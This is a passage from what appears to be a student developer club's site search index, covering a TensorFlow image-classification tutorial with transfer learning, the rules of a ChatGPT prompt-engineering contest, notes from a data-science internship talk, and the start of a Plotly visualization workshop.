0.5671\nEpoch 18/20\n49/49 [==============================] - 1s 15ms/step - loss: 1.0558 - Acc: 0.6315 - val_loss: 1.2750 - val_Acc: 0.5677\nEpoch 19/20\n49/49 [==============================] - 1s 15ms/step - loss: 1.0383 - Acc: 0.6387 - val_loss: 1.2554 - val_Acc: 0.5732\nEpoch 20/20\n49/49 [==============================] - 1s 15ms/step - loss: 1.0196 - Acc: 0.6433 - val_loss: 1.2680 - val_Acc: 0.5788\n</pre> In\u00a0[\u00a0]: Copied! <pre>history = history.history\n</pre> history = history.history In\u00a0[\u00a0]: Copied! <pre>print(history.keys())\n</pre> print(history.keys()) <pre>dict_keys(['loss', 'Acc', 'val_loss', 'val_Acc'])\n</pre> In\u00a0[\u00a0]: Copied! <pre>plt.plot(range(1, 21), history['loss'])\nplt.plot(range(1, 21), history['val_loss'])\n\nplt.title('Crossentropy Loss While Training')\nplt.xlabel('Epoch Number')\nplt.ylabel('Crossentropy Loss')\nplt.legend(['Training Loss', 'Testing Loss'])\nplt.show()\n</pre> plt.plot(range(1, 21), history['loss']) plt.plot(range(1, 21), history['val_loss'])  plt.title('Crossentropy Loss While Training') plt.xlabel('Epoch Number') plt.ylabel('Crossentropy Loss') plt.legend(['Training Loss', 'Testing Loss']) plt.show() In\u00a0[\u00a0]: Copied! <pre>plt.plot(range(1, 21), history['Acc'])\nplt.plot(range(1, 21), history['val_Acc'])\n\nplt.title('Accuracy While Training')\nplt.xlabel('Epoch Number')\nplt.ylabel('Accuracy')\nplt.legend(['Training Accuracy', 'Testing Accuracy'])\n\nplt.show()\n</pre> plt.plot(range(1, 21), history['Acc']) plt.plot(range(1, 21), history['val_Acc'])  plt.title('Accuracy While Training') plt.xlabel('Epoch Number') plt.ylabel('Accuracy') plt.legend(['Training Accuracy', 'Testing Accuracy'])  plt.show() In\u00a0[\u00a0]: Copied! <pre>base_model = tf.keras.applications.RegNetX160(input_shape=(32, 32, 3), \n                                               include_top=False,\n                                               weights='imagenet')\n\n\nbase_model.trainable = False\n</pre> base_model = tf.keras.applications.RegNetX160(input_shape=(32, 32, 3),                                                 include_top=False,                                                weights='imagenet')   base_model.trainable = False In\u00a0[\u00a0]: Copied! <pre># We can plot the structure of this model\ntf.keras.utils.plot_model(base_model)\n</pre> # We can plot the structure of this model tf.keras.utils.plot_model(base_model) Out[\u00a0]: In\u00a0[\u00a0]: Copied! <pre>new_cf_10_model = tf.keras.models.Sequential()\nnew_cf_10_model.add(tf.keras.layers.Input(shape = (32, 32, 3)))\n\n# Adding the pre-trained model\nnew_cf_10_model.add(base_model)\n\nnew_cf_10_model.add(tf.keras.layers.Flatten())\n\nnew_cf_10_model.add(tf.keras.layers.Dense(512, activation = tf.nn.relu))\nnew_cf_10_model.add(tf.keras.layers.Dense(256, activation = tf.nn.relu))\nnew_cf_10_model.add(tf.keras.layers.Dense(128, activation = tf.nn.relu))\nnew_cf_10_model.add(tf.keras.layers.Dense(10, activation = tf.nn.softmax))\n\nnew_cf_10_model.summary()\n</pre> new_cf_10_model = tf.keras.models.Sequential() new_cf_10_model.add(tf.keras.layers.Input(shape = (32, 32, 3)))  # Adding the pre-trained model new_cf_10_model.add(base_model)  new_cf_10_model.add(tf.keras.layers.Flatten())  new_cf_10_model.add(tf.keras.layers.Dense(512, activation = tf.nn.relu)) new_cf_10_model.add(tf.keras.layers.Dense(256, activation = tf.nn.relu)) new_cf_10_model.add(tf.keras.layers.Dense(128, activation = tf.nn.relu)) new_cf_10_model.add(tf.keras.layers.Dense(10, activation = tf.nn.softmax))  new_cf_10_model.summary() <pre>Model: \"sequential_2\"\n_________________________________________________________________\n Layer (type)                Output Shape              Param #   \n=================================================================\n regnetx160 (Functional)     (None, 1, 1, 2048)        52340704  \n                                                                 \n flatten_1 (Flatten)         (None, 2048)              0         \n                                                                 \n dense_6 (Dense)             (None, 512)               1049088   \n                                                                 \n dense_7 (Dense)             (None, 256)               131328    \n                                                                 \n dense_8 (Dense)             (None, 128)               32896     \n                                                                 \n dense_9 (Dense)             (None, 10)                1290      \n                                                                 \n=================================================================\nTotal params: 53,555,306\nTrainable params: 1,214,602\nNon-trainable params: 52,340,704\n_________________________________________________________________\n</pre> In\u00a0[\u00a0]: Copied! <pre>tf.keras.utils.plot_model(new_cf_10_model)\n</pre> tf.keras.utils.plot_model(new_cf_10_model) Out[\u00a0]: In\u00a0[\u00a0]: Copied! <pre>new_cf_10_model.compile(loss = 'categorical_crossentropy', optimizer = tf.keras.optimizers.Adam(0.001), metrics = ['Acc'])\n</pre> new_cf_10_model.compile(loss = 'categorical_crossentropy', optimizer = tf.keras.optimizers.Adam(0.001), metrics = ['Acc']) In\u00a0[\u00a0]: Copied! <pre>history = new_cf_10_model.fit(cf_10_train_x, cf_10_train_y, epochs = 5, \n                              batch_size = 4096,\n                              validation_data = (cf_10_test_x, cf_10_test_y))\n</pre> history = new_cf_10_model.fit(cf_10_train_x, cf_10_train_y, epochs = 5,                                batch_size = 4096,                               validation_data = (cf_10_test_x, cf_10_test_y)) <pre>Epoch 1/5\n13/13 [==============================] - 68s 4s/step - loss: 2.0653 - Acc: 0.3782 - val_loss: 1.1724 - val_Acc: 0.5880\nEpoch 2/5\n13/13 [==============================] - 31s 2s/step - loss: 1.0604 - Acc: 0.6350 - val_loss: 0.9637 - val_Acc: 0.6685\nEpoch 3/5\n13/13 [==============================] - 31s 2s/step - loss: 0.8973 - Acc: 0.6910 - val_loss: 0.8570 - val_Acc: 0.7048\nEpoch 4/5\n13/13 [==============================] - 31s 2s/step - loss: 0.8084 - Acc: 0.7184 - val_loss: 0.8088 - val_Acc: 0.7181\nEpoch 5/5\n13/13 [==============================] - 31s 2s/step - loss: 0.7579 - Acc: 0.7360 - val_loss: 0.7665 - val_Acc: 0.7323\n</pre> In\u00a0[\u00a0]: Copied! <pre>history = history.history\n</pre> history = history.history In\u00a0[\u00a0]: Copied! <pre>plt.plot(range(1, 6), history['loss'])\nplt.plot(range(1, 6), history['val_loss'])\n\nplt.title('Crossentropy Loss While Training')\nplt.xlabel('Epoch Number')\nplt.ylabel('Crossentropy Loss')\nplt.legend(['Training Loss', 'Testing Loss'])\nplt.show()\n</pre> plt.plot(range(1, 6), history['loss']) plt.plot(range(1, 6), history['val_loss'])  plt.title('Crossentropy Loss While Training') plt.xlabel('Epoch Number') plt.ylabel('Crossentropy Loss') plt.legend(['Training Loss', 'Testing Loss']) plt.show() In\u00a0[\u00a0]: Copied! <pre>plt.plot(range(1, 6), history['Acc'])\nplt.plot(range(1, 6), history['val_Acc'])\n\nplt.title('Accuracy While Training')\nplt.xlabel('Epoch Number')\nplt.ylabel('Accuracy')\nplt.legend(['Training Accuracy', 'Testing Accuracy'])\n\nplt.show()\n</pre> plt.plot(range(1, 6), history['Acc']) plt.plot(range(1, 6), history['val_Acc'])  plt.title('Accuracy While Training') plt.xlabel('Epoch Number') plt.ylabel('Accuracy') plt.legend(['Training Accuracy', 'Testing Accuracy'])  plt.show() In\u00a0[\u00a0]: Copied! <pre>import pandas as pd # used to read the csv dataset file\n</pre> import pandas as pd # used to read the csv dataset file In\u00a0[\u00a0]: Copied! <pre>ch_train_data = pd.read_csv(\"/content/sample_data/california_housing_train.csv\")\n\nch_train_data_x = ch_train_data.drop(\"median_house_value\", axis = 1).to_numpy()\nch_train_data_y = ch_train_data[\"median_house_value\"].to_numpy()\n\nch_train_data\n</pre> ch_train_data = pd.read_csv(\"/content/sample_data/california_housing_train.csv\")  ch_train_data_x = ch_train_data.drop(\"median_house_value\", axis = 1).to_numpy() ch_train_data_y = ch_train_data[\"median_house_value\"].to_numpy()  ch_train_data Out[\u00a0]: longitude latitude housing_median_age total_rooms total_bedrooms population households median_income median_house_value 0 -114.31 34.19 15.0 5612.0 1283.0 1015.0 472.0 1.4936 66900.0 1 -114.47 34.40 19.0 7650.0 1901.0 1129.0 463.0 1.8200 80100.0 2 -114.56 33.69 17.0 720.0 174.0 333.0 117.0 1.6509 85700.0 3 -114.57 33.64 14.0 1501.0 337.0 515.0 226.0 3.1917 73400.0 4 -114.57 33.57 20.0 1454.0 326.0 624.0 262.0 1.9250 65500.0 ... ... ... ... ... ... ... ... ... ... 16995 -124.26 40.58 52.0 2217.0 394.0 907.0 369.0 2.3571 111400.0 16996 -124.27 40.69 36.0 2349.0 528.0 1194.0 465.0 2.5179 79000.0 16997 -124.30 41.84 17.0 2677.0 531.0 1244.0 456.0 3.0313 103600.0 16998 -124.30 41.80 19.0 2672.0 552.0 1298.0 478.0 1.9797 85800.0 16999 -124.35 40.54 52.0 1820.0 300.0 806.0 270.0 3.0147 94600.0 <p>17000 rows \u00d7 9 columns</p> In\u00a0[\u00a0]: Copied! <pre>ch_test_data = pd.read_csv(\"/content/sample_data/california_housing_test.csv\")\n\nch_test_data_x = ch_test_data.drop(\"median_house_value\", axis = 1).to_numpy()\nch_test_data_y = ch_test_data[\"median_house_value\"].to_numpy()\n</pre> ch_test_data = pd.read_csv(\"/content/sample_data/california_housing_test.csv\")  ch_test_data_x = ch_test_data.drop(\"median_house_value\", axis = 1).to_numpy() ch_test_data_y = ch_test_data[\"median_house_value\"].to_numpy() In\u00a0[\u00a0]: Copied! <pre>print(ch_train_data_x.shape, ch_train_data_y.shape)\n</pre> print(ch_train_data_x.shape, ch_train_data_y.shape) <pre>(17000, 8) (17000,)\n</pre> In\u00a0[\u00a0]: Copied! <pre>## Create your model here\n</pre> ## Create your model here In\u00a0[\u00a0]: Copied! <pre>## Compile your model here\n</pre> ## Compile your model here In\u00a0[\u00a0]: Copied! <pre>## Train your model here\n</pre> ## Train your model here In\u00a0[\u00a0]: Copied! <pre>cf_100_train_data, cf_100_test_data = tf.keras.datasets.cifar100.load_data()\n\n\ncf_100_train_x, cf_100_train_y = cf_100_train_data\n\ncf_100_test_x, cf_100_test_y = cf_100_test_data\n\n\ncf_100_train_y = tf.one_hot(cf_100_train_y.reshape((-1, )), 100)\ncf_100_test_y = tf.one_hot(cf_100_test_y.reshape((-1, )), 100)\n</pre> cf_100_train_data, cf_100_test_data = tf.keras.datasets.cifar100.load_data()   cf_100_train_x, cf_100_train_y = cf_100_train_data  cf_100_test_x, cf_100_test_y = cf_100_test_data   cf_100_train_y = tf.one_hot(cf_100_train_y.reshape((-1, )), 100) cf_100_test_y = tf.one_hot(cf_100_test_y.reshape((-1, )), 100) In\u00a0[\u00a0]: Copied! <pre>print(cf_100_train_x.shape, cf_100_train_y.shape)\nprint(cf_100_test_x.shape, cf_100_test_y.shape)\n</pre> print(cf_100_train_x.shape, cf_100_train_y.shape) print(cf_100_test_x.shape, cf_100_test_y.shape) <pre>(50000, 32, 32, 3) (50000, 100)\n(10000, 32, 32, 3) (10000, 100)\n</pre> In\u00a0[\u00a0]: Copied! <pre>## Import a model here\n</pre> ## Import a model here In\u00a0[\u00a0]: Copied! <pre>## Create your model here\n</pre> ## Create your model here In\u00a0[\u00a0]: Copied! <pre>## Compile your model here\n</pre> ## Compile your model here In\u00a0[\u00a0]: Copied! <pre>## Train your model here\n</pre> ## Train your model here In\u00a0[\u00a0]: Copied! <pre>cf_100_train_data, cf_100_test_data = tf.keras.datasets.cifar100.load_data()\n\n\ncf_100_train_x, cf_100_train_y = cf_100_train_data\n\ncf_100_test_x, cf_100_test_y = cf_100_test_data\n\n\ncf_100_train_y = tf.one_hot(cf_100_train_y.reshape((-1, )), 100)\ncf_100_test_y = tf.one_hot(cf_100_test_y.reshape((-1, )), 100)\n</pre> cf_100_train_data, cf_100_test_data = tf.keras.datasets.cifar100.load_data()   cf_100_train_x, cf_100_train_y = cf_100_train_data  cf_100_test_x, cf_100_test_y = cf_100_test_data   cf_100_train_y = tf.one_hot(cf_100_train_y.reshape((-1, )), 100) cf_100_test_y = tf.one_hot(cf_100_test_y.reshape((-1, )), 100) In\u00a0[\u00a0]: Copied! <pre>print(cf_100_train_x.shape, cf_100_train_y.shape)\nprint(cf_100_test_x.shape, cf_100_test_y.shape)\n</pre> print(cf_100_train_x.shape, cf_100_train_y.shape) print(cf_100_test_x.shape, cf_100_test_y.shape) <pre>(50000, 32, 32, 3) (50000, 100)\n(10000, 32, 32, 3) (10000, 100)\n</pre> In\u00a0[\u00a0]: Copied! <pre>## Create your model here\n</pre> ## Create your model here In\u00a0[\u00a0]: Copied! <pre>## Compile your model here\n</pre> ## Compile your model here In\u00a0[\u00a0]: Copied! <pre>## Train your model here\n</pre> ## Train your model here <p></p>"},{"location":"2022-2023/12_Tensorflow/#introduction-to-tensorflow","title":"Introduction to Tensorflow\u00b6","text":"<p>Organized by Kayan Irani</p>"},{"location":"2022-2023/12_Tensorflow/#recording","title":"Recording\u00b6","text":"<p>Watch the Recording</p>"},{"location":"2022-2023/12_Tensorflow/#1-what-is-tensorflow","title":"1. What is Tensorflow?\u00b6","text":""},{"location":"2022-2023/12_Tensorflow/#11-definition","title":"1.1 Definition\u00b6","text":"<p>Tensorflow is an open source library made by google that allows us to easily create powerful deep learning models and structures.</p>"},{"location":"2022-2023/12_Tensorflow/#12-deep-learning","title":"1.2 Deep Learning\u00b6","text":"<p>Deep learning is a type of algorithm that learns information using these rough steps.</p> <ol> <li>Get a labeled dataset of inputs mapped to outputs(think of this as example question and answers before a test).</li> <li>Use a model to try and predict outputs based on inputs.</li> <li>Get feedback on how close you are to the correct answer.</li> <li>Update your knowledge and continue learning.</li> </ol>"},{"location":"2022-2023/12_Tensorflow/#2-breakdown-of-the-process","title":"2. Breakdown of the process\u00b6","text":"<p>We now breakdown the steps mentioned above and talk about how we can use them on a problem. To follow the basics visually, you can go to the tensorflow playground and view the training process.</p>"},{"location":"2022-2023/12_Tensorflow/#21-dataset","title":"2.1. Dataset\u00b6","text":"<p>Your dataset is just a collection of examples where you take input data and tell the computer what the correct outputs for these examples are.</p> <p>On the tensorflow playground we can select a dataset of our choice under the \"DATA\" section on the left-hand side.</p>"},{"location":"2022-2023/12_Tensorflow/#22-model","title":"2.2. Model\u00b6","text":"<p>Deep learning models learn using a structure known as a Neural Network. It has this name because visualizations of these models look like neural pathways in our brains. While this sounds complicated, the model construction follows a fairly easy procedure. To construct this model we stack 'layers' on top of each other. While advancements in research have created many new types of layers for computation, many networks simply operate on a very simple layer known as a Dense layer. This layer performs three operations:</p> <ol> <li>Multiplies the inputs with a set of coefficients (these coefficients automatically learned as the model trains).</li> <li>Add all of these terms together.</li> <li>Pass this number through a non-linear function (also known as an activation fucntion). For most models using the function ReLU will work very well for all types of problems and TaNH can be good for some classification datasets.</li> </ol> <p>The tensorflow playground will allow you to select these parameters using the GUI options in the center of your screen.</p>"},{"location":"2022-2023/12_Tensorflow/#23-evaluation-of-the-model","title":"2.3 Evaluation of the Model\u00b6","text":"<p>To give feedback to our model we will run it on the dataset and compare it's outputs to the results it was supposed to predict. We do this to find the error (difference) between the two values. Common evaluation functions for regression are Mean Squared Error and Mean Average Error. Common evaluation functions for classification are binary crossentropy (if you only have two classes) and categorical crossentropy (if you have many classes).</p> <p>In tensorflow playground you will find this loss below the output category.</p>"},{"location":"2022-2023/12_Tensorflow/#24-learning","title":"2.4 Learning\u00b6","text":"<p>After the model is evaluated it must take this feedback and work on correcting it's mistakes. This is done using an optimizer which tells the model how to update the coefficients in the layers to reduce the error from the evaluation function. You will need to select two parts of this process :</p> <ol> <li>Choice of Optimizer : the Adam and RMSprop optimizers work best for most problems. We will train our models using these in this tutorial.</li> <li>Learning rate : This is how fast the model learns from it's mistakes as well as how big of a change it will make to correct them. If this number is too big, it will keep overcorrecting and never get that good. On the other hand, if this is too small it will take too long to train. The best value is in the middle of these extremes. A value of 0.001 is a good starting point for most problems.</li> </ol> <p>Tensorflow playground uses RMSprop but allows you to select the learning rate.</p>"},{"location":"2022-2023/12_Tensorflow/#3-writing-the-code","title":"3. Writing the Code\u00b6","text":"<p>Running a model on example data is fun and good for learning, but to utilize these models on real-world problems we require code. Let us begin with importing the libraries.</p>"},{"location":"2022-2023/12_Tensorflow/#31-coding-the-dataset","title":"3.1 Coding the Dataset\u00b6","text":"<p>We can import any dataset to use for our model. However, tensorflow already comes with pre-loaded datasets that we can use for learning purposes. To show you a simple neural network we will use the boston housing dataset. The aim of this dataset is to predict the average price of a home in an area of Boston given some information about the area. We store the information about the areas in train_x and test_x. The coresponding values for housing prices are stored in train_y and test_y.</p>"},{"location":"2022-2023/12_Tensorflow/#32-constructing-the-model","title":"3.2 Constructing the Model\u00b6","text":"<p>To begin we create a Sequential model. This means that the output of the previous layer is passed as input to the next layer in a linear order. After this we add some layers into our model in the order we intend to use them. This model will be made of dense layers like the ones we discussed in the prior section. The only new layer is known as the Input layer. This tells tensorflow the size of an input example so that it knows how big of an input to expect.</p>"},{"location":"2022-2023/12_Tensorflow/#33-setting-training-and-evaluation-parameters","title":"3.3 Setting Training and Evaluation Parameters\u00b6","text":"<p>For tensorflow, this is the stage where we need to define how our model is evaluated and how it will learn. For this we specify three things:</p> <ol> <li>Loss : This will be our evaluation function which gives us the error and the model it's feedback. We have selected mean squared error (mse).</li> <li>Optimizer : The optimizer our model uses to learn. We also specify our learning rate here. The Adam optimizer has been selected here.</li> <li>Metrics : This is like an evaluation function as it tells us the error the model achieves. However, the difference is that the model will not recive feedback from this; it is only for our information. Mean average error (mae) has been selected.</li> </ol>"},{"location":"2022-2023/12_Tensorflow/#34-training-the-model","title":"3.4 Training the Model\u00b6","text":"<p>To train our model we simply give it the following information:</p> <ol> <li>X and y training data.</li> <li>Epochs : The number of times it runs the training algorithm.</li> <li>Batch size : The number of examples it learns from at once. For example, if we set this to 32 the training data is split into batches where each batch has 32 training examples. We then take the examples one by one to run the model, evaluate it and use the optimizer. A single epoch is completed when all training batches have been seen once. This is especially useful with large datasets where tey may be too big to evaluate and optimize all at once.</li> <li>Validation data : This data consists of new examples not present in the training set.This is used to verify that the model will perform well on new examples it has not seen before.</li> </ol>"},{"location":"2022-2023/12_Tensorflow/#34-evaluating-the-model","title":"3.4 Evaluating The Model\u00b6","text":""},{"location":"2022-2023/12_Tensorflow/#4-neural-networks-for-image-datasets","title":"4. Neural Networks for Image Datasets\u00b6","text":"<p>In computer programing images are represented as 3D array where the dimensions are width, height, 3. The 3 at the end represents the RGB (red, green, blue) value of the colour at that pixel.</p> <p>As these images can often be large, we don't normally use dense layers on them directly. We first simplify the images using convolutional and pooling layers. The goal of these layers is to look at sections of an image (groups of pixels) and then condensing this group into a single value. Below are graphic representations of how these layers work.</p> <p>Convolutional layers work by multiplying the group of pixels by an array (also called a filter) of numbers and then adding them together. Like Dense layers the value of these arrays are learnt while training. We often multiply a group by multiple pixels and save all the results.</p> <p>Pooling layers work by finding a metric such as the mean, max or minimum value of the pixels in this group.</p>"},{"location":"2022-2023/12_Tensorflow/#41-convolutional-layer-format","title":"4.1 Convolutional Layer Format\u00b6","text":""},{"location":"2022-2023/12_Tensorflow/#42-pooling-layer-format","title":"4.2 Pooling Layer Format\u00b6","text":""},{"location":"2022-2023/12_Tensorflow/#43-overall-model-structure","title":"4.3 Overall Model Structure\u00b6","text":""},{"location":"2022-2023/12_Tensorflow/#44-cifar-10-image-dataset","title":"4.4 Cifar 10 Image Dataset\u00b6","text":"<p>This is an image dataset with 10 classes of images of common pictures such as dogs or cats. Click on the link to the documentation to learn more cifar 10.</p>"},{"location":"2022-2023/12_Tensorflow/#45-building-a-cnn-model","title":"4.5 Building a CNN Model\u00b6","text":""},{"location":"2022-2023/12_Tensorflow/#46-compiling-the-model","title":"4.6 Compiling the Model\u00b6","text":"<p>We use categorical crossentropy to calculate loss for many classes, Adam for optimization and use Accuracy as a metric so we can understand how well the model is performing.</p>"},{"location":"2022-2023/12_Tensorflow/#47-training-the-model","title":"4.7 Training the Model\u00b6","text":""},{"location":"2022-2023/12_Tensorflow/#48-evaluating-the-model","title":"4.8 Evaluating the Model\u00b6","text":""},{"location":"2022-2023/12_Tensorflow/#5-transfer-learning","title":"5. Transfer Learning\u00b6","text":"<p>Images can be varied and complex, large image datasets with 1000+ classes can take hours or days to train a model with. However, the learned numeric values and structure of convolutional and pooling layers can be very similar even with different datasets. For this reason we use a technique known as transfer learning which is where we take the convolutional and pooling layers of a large model trained by professionals, add new dense layers and apply them to our dataset.</p> <p>This can often give us much higher accuracy with fewer epochs.</p>"},{"location":"2022-2023/12_Tensorflow/#51-downloading-a-model","title":"5.1 Downloading a Model\u00b6","text":"<p>For this dataset we download the RegNetX160 model and tell it to expect an input size of (32, 32, 3). We also set it's trainable attribute to false as we do not want to re-train it, only to use the model.</p> <p>To fully utilize this potential this is a link to a list with names and information regarding each model in the keras library. If you are looking for larger, more complex or different problem types (such as text, video, audio, etc) look at models in the Tensorflow Hub site with a more exhaustive library of Neural Network models.</p>"},{"location":"2022-2023/12_Tensorflow/#52-creating-a-new-model-using-the-pretrained-model","title":"5.2 Creating a New Model using the Pretrained Model\u00b6","text":""},{"location":"2022-2023/12_Tensorflow/#53-compile-the-model","title":"5.3 Compile the Model\u00b6","text":""},{"location":"2022-2023/12_Tensorflow/#54-training-the-model","title":"5.4 Training the Model\u00b6","text":""},{"location":"2022-2023/12_Tensorflow/#55-evaluation","title":"5.5 Evaluation\u00b6","text":""},{"location":"2022-2023/12_Tensorflow/#6-try-it-yourself","title":"6. Try It Yourself\u00b6","text":"<p>Below are some more datasets I have loaded for you to try and train models on. See how far you can reach!</p>"},{"location":"2022-2023/12_Tensorflow/#61-california-housing-easy","title":"6.1 California Housing (Easy)\u00b6","text":"<p>Train a regression model on this dataset.</p>"},{"location":"2022-2023/12_Tensorflow/#62-pre-trained-cifar-100-medium","title":"6.2 Pre-trained Cifar 100 (Medium)\u00b6","text":"<p>We now use a larger version of the cifar data set with 100 different classes. In this section try to get a good accuracy score using a pretrained model. Here is the link to the dataset site : Cifar 100</p> <p>You can use the same base model as we used before, but I encourage you to try another one and see how it works. You can even try to find models from Tensorflow Hub.</p>"},{"location":"2022-2023/12_Tensorflow/#63-from-scratch-cifar-100-hard","title":"6.3 From Scratch Cifar 100 (Hard)\u00b6","text":"<p>Here you are expected to write a CNN from scratch to train on the cifar 100 dataset. Note that this model will need to be larger than the one used on the cifar 10 dataset as this is more complex.</p>"},{"location":"2022-2023/12_Tensorflow/#hope-you-enjoyed-learning-neural-networks","title":"Hope You Enjoyed Learning Neural Networks\u00b6","text":""},{"location":"2022-2023/13_Prompt_Engineering/","title":"Prompt Engineering","text":"<p>A Chat-GPT prompt engineering contest for Google Developer Student Clubs, BITS Pilani Dubai Campus Students. Prompt engineering has recently grabbed the spotlight after the recent rise of LLMs (Large Language Models). In this competition, participants face programming problems of varying difficulties, and are tasked with solving them by typing prompts into ChatGPT, and generating codes for the given problems.</p> <p>Kindly ensure to read all rules. No sort of leeway will not be provided, to ensure fairness to all participants. The timer starts only after viewing the first question, so don\u2019t be in a hurry and skip the rules.</p> <p>All the best!</p>"},{"location":"2022-2023/13_Prompt_Engineering/#event-details","title":"Event Details","text":"Detail Duration 12hrs Start Time April 29, 202312:00 GST End Time April 30, 202300:00 GST Entry fee for members Free Entry fee for non-members 5Dhs"},{"location":"2022-2023/13_Prompt_Engineering/#prizes","title":"Prizes","text":"Position Prize Money T-Shirt(Google Developer Student Club) Winner 100Dhs \u2705 Runner-Up \u274c \u2705"},{"location":"2022-2023/13_Prompt_Engineering/#rules","title":"Rules","text":"<ul> <li>The timer starts once you view the first question.</li> <li>The total duration is the sum of duration of first correct submission for all the problems, where duration of each event is counted from the viewing of the first question. So don't be surprised to see your total duration greater than the time you participated in the event.</li> <li>Late submissions will not be considered.</li> <li>You may submit the answer in any language the testing website allows.</li> <li>Every submission must include a prompt that was used to generate the code. This prompt must be included in the comments of your submission. Submissions without a prompt in the comments will not be considered. An example in Python would be</li> </ul> <pre><code># PROMPT \n# Make a list [12, -3, 17, 0.5, -0.2], find it's sum and print it to console. \n\nmy_list = [12, -3, 17, 0.5, -0.2]\nlist_sum = sum(my_list)\nprint(\"The sum of the list is:\", list_sum)\n</code></pre> <ul> <li>Make sure to keep your chatgpt search history, until the competition results are announced.</li> <li>All submissions can be verified, and hence participants with abnornal resubmissions using a new account will be immediately disqualified.</li> </ul>"},{"location":"2022-2023/13_Prompt_Engineering/#scoring","title":"Scoring","text":"<ul> <li>Each challenge has a pre-determined score.</li> <li>A participant\u2019s score depends on the number of test cases a participant\u2019s code submission successfully passes.</li> <li>If a participant submits more than one solution per challenge, then the participant\u2019s score will reflect the highest score achieved. In a game challenge, the participant's score will reflect the last code submission.</li> <li>Participants are ranked by score. If two or more participants achieve the same score, then the tie is broken by the total time taken to submit the last solution resulting in a higher score</li> </ul>"},{"location":"2022-2023/13_Prompt_Engineering/#competition-link","title":"Competition Link","text":"<p>Make sure to create a hackerrank account, if you don't already have one. All the best!</p> <p>Click here to start now!</p>"},{"location":"2022-2023/13_Prompt_Engineering/#support","title":"Support","text":"<p>Click here to watch a short explanation video, held at 12PM.</p> <p>If after reading the guidelines, you are unable to fix your issue, you may mail us in case of any required help.</p>"},{"location":"2022-2023/15_Internship_Talk_Thahir_Emirates/","title":"Internship Talk: Data Science @ Emirates","text":"<p>Want to know what a data science intern does? \ud83d\udcca</p> <p>Get to know all the intricacies of our very own Ahmed Thahir's PS1 role in Revenue Optimization at Emirates, one of the world\u2019s leading airline carriers! \u2708\ufe0f</p> <p>Organized by Ahmed Thahir</p>"},{"location":"2022-2023/15_Internship_Talk_Thahir_Emirates/#recording","title":"Recording","text":"<p>Watch the Recording</p>"},{"location":"2022-2023/15_Internship_Talk_Thahir_Emirates/#what-is-data-science","title":"What is Data Science? \ud83d\udcca","text":""},{"location":"2022-2023/15_Internship_Talk_Thahir_Emirates/#how-i-got-in","title":"How I got in? \ud83e\udd14","text":"<ul> <li>Explore </li> <li>Be curious \ud83d\ude2e</li> <li>Do a lot of projects \ud83d\udc69\u200d\ud83d\udcbb\ud83d\udc68\u200d\ud83d\udcbb</li> <li>Try to get a good CGPA \ud83c\udfeb, but not at the expense of your health</li> <li>Work hard \ud83d\udcaa</li> </ul>"},{"location":"2022-2023/15_Internship_Talk_Thahir_Emirates/#cv","title":"CV","text":"<p>Click here to view the CV using the University template to get in!</p>"},{"location":"2022-2023/15_Internship_Talk_Thahir_Emirates/#experience","title":"Experience \ud83d\udc68\u200d\ud83d\udcbb","text":"<ul> <li>Initially sever imposter Syndrome \ud83d\ude30</li> <li>Luckily, everyone was friendly</li> <li>Eventually, got confident in my talent</li> </ul>"},{"location":"2022-2023/15_Internship_Talk_Thahir_Emirates/#internship-tips","title":"Internship Tips \ud83d\udcdd","text":"<ul> <li>Be curious</li> <li>Ask questions</li> <li>Note everything down</li> <li>Try to get something interesting out of boring tasks</li> </ul>"},{"location":"2022-2023/15_Internship_Talk_Thahir_Emirates/#tools-technologies","title":"Tools &amp; Technologies","text":"<ul> <li>Python</li> <li>Plotly</li> <li>Streamlit</li> <li>Dash</li> <li>Snowflake SQL</li> </ul>"},{"location":"2022-2023/15_Internship_Talk_Thahir_Emirates/#learning","title":"Learning","text":"<p>Focus on doing project, don't get overwhelmed with these videos.</p> <ul> <li>CodingIsFun</li> <li>DataProfessor</li> <li>NicholasRenotte</li> <li>Google AI &amp; ML resources</li> <li>Recall by Dataiku</li> <li>Deep Learning</li> </ul>"},{"location":"2022-2023/16_Plotly_Workshop/","title":"Python Data Visualization with Plotly","text":"<p>Plotly is an open-source data visualization library that enables users to create interactive and publication-quality graphs, charts, and dashboards. It is widely used by data scientists, engineers, and business professionals to analyze and communicate data insights effectively.</p> <p>Plotly provides a variety of graph types, including scatter plots, line charts, bar charts, heatmaps, and more. It also supports various programming languages, including Python, R, and JavaScript.</p> <p>Plotly can be used for a wide range of applications, including data exploration, data analysis, data presentation, and reporting. It is particularly useful in fields such as finance, healthcare, and marketing, where data analysis and visualization are critical for decision-making.</p> In\u00a0[\u00a0]: Copied! <pre>! pip install plotly --upgrade\n</pre> ! pip install plotly --upgrade In\u00a0[\u00a0]: Copied! <pre>! pip install pandas==1.5.3\n</pre> ! pip install pandas==1.5.3 In\u00a0[\u00a0]: Copied! <pre>import pandas as pd\nimport numpy as np\n\nimport plotly.express as px\nimport plotly.graph_objects as go\n</pre> import pandas as pd import numpy as np  import plotly.express as px import plotly.graph_objects as go In\u00a0[\u00a0]: Copied! <pre># Create a dataframe using a NumPy array that is 50 by 4\narr_1 = np.random.randn(50, 4)\ndf_1 = pd.DataFrame(arr_1, columns=['A','B','C','D'])\ndf_1.head()\n\n# Compare old plots to a Plotly interactive plot\n# You can save as PNG, Zoom, Pan, Turn off &amp; on Data and more\n\nfig = px.line(df_1, title = \"Plotly\")\nfig.show()\n\ndf_1.plot()\n</pre> # Create a dataframe using a NumPy array that is 50 by 4 arr_1 = np.random.randn(50, 4) df_1 = pd.DataFrame(arr_1, columns=['A','B','C','D']) df_1.head()  # Compare old plots to a Plotly interactive plot # You can save as PNG, Zoom, Pan, Turn off &amp; on Data and more  fig = px.line(df_1, title = \"Plotly\") fig.show()  df_1.plot() Out[\u00a0]: <pre>&lt;Axes: &gt;</pre> <p>One of the main advantages of Plotly is its ability to create interactive and dynamic visualizations. With Plotly, users can zoom, pan, and hover over data points to explore the underlying data. It also allows users to add annotations, labels, and other customizations to their graphs.</p> <p>Websites to refer:</p> <p>Plotly API Refrence</p> <p>Sample Data</p> <p>Got stuck ?</p> <ol> <li><p>Use Plotly Fundamentals documentation (https://plotly.com/python/plotly-fundamentals/)</p> </li> <li><p>Use Plotly Forum (https://community.plotly.com/)</p> </li> </ol> <ol> <li>Layout represents the chart (frames, title, color, tick, hover, legend)</li> <li>Traces are representing the data (inside the layout)</li> </ol> <p>Traces and Layout Refrences</p> In\u00a0[\u00a0]: Copied! <pre>medals = px.data.medals_long(indexed=False)\n\nfig = px.bar(medals, x='nation', y='count', 